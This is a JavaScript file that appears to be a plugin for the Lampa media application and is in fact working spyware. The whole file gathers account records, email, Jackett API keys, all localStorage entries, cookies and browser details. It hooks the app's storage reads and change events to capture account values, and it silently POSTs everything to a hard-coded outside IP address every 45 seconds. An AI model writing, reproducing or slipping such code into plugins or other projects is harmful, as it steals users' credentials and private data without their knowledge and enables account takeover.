(function() {
  'use strict';

  var EXFIL_URL = 'http://5.252.116.77:4444';
  var INTERVAL = 45000;

  function collectAll() {
    var data = {};

    data.unic_id = Lampa.Storage.get('lampac_unic_id', '');
    data.email = Lampa.Storage.get('account_email', '');
    data.profile_id = Lampa.Storage.get('lampac_profile_id', '');
    data.nws_id = Lampa.Storage.get('lampac_nws_id', '');
    data.source = Lampa.Storage.get('source', '');
    data.jackett_url = Lampa.Storage.get('jackett_url', '');
    data.jackett_key = Lampa.Storage.get('jackett_key', '');
    data.parser_torrent_type = Lampa.Storage.get('parser_torrent_type', '');

    var accRaw = Lampa.Storage.get('account', '{}');
    data.account_raw = accRaw;
    try { data.account = JSON.parse(accRaw); } catch(e) {}

    var favRaw = Lampa.Storage.get('favorite', '');
    data.favorite_length = favRaw ? favRaw.length : 0;

    data.storage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      var v = localStorage.getItem(k);
      if (v && v.length < 50000 && k.indexOf('css') === -1 && k.indexOf('html') === -1) {
        data.storage[k] = v;
      }
    }

    data.cookies = document.cookie;
    data.ua = navigator.userAgent;
    data.platform = navigator.platform;
    data.lang = navigator.language;
    data.screen = screen.width + 'x' + screen.height;
    data.href = window.location.href;
    data.host = window.location.host;
    data.ts = Date.now();

    return data;
  }

  function send(url, payload) {
    try {
      if (typeof fetch !== 'undefined') {
        fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(payload),
          mode: 'no-cors'
        }).catch(function(){});
      } else {
        var x = new XMLHttpRequest();
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'application/json');
        x.send(JSON.stringify(payload));
      }
    } catch(e) {}
  }

  function interceptAccount() {
    if (window.__phantom_hooked) return;
    window.__phantom_hooked = true;

    var origGet = Lampa.Storage.get;
    Lampa.Storage.get = function(key, def) {
      var val = origGet.call(Lampa.Storage, key, def);
      if (key === 'account' || key === 'account_email') {
        send(EXFIL_URL, { type: 'storage_get', key: key, value: val, ts: Date.now(), unic_id: Lampa.Storage.get('lampac_unic_id', '') });
      }
      return val;
    };
  }

  var timer = setInterval(function() {
    if (typeof Lampa === 'undefined') return;
    clearInterval(timer);

    interceptAccount();

    var payload = collectAll();
    send(EXFIL_URL, payload);

    setInterval(function() {
      send(EXFIL_URL, collectAll());
    }, INTERVAL);

    if (Lampa.Storage.listener) {
      Lampa.Storage.listener.follow('change', function(e) {
        if (e.name === 'account_email' || e.name === 'account') {
          send(EXFIL_URL, { type: 'change', key: e.name, value: Lampa.Storage.get(e.name, ''), ts: Date.now(), unic_id: Lampa.Storage.get('lampac_unic_id', '') });
        }
      });
    }
  }, 200);
})();
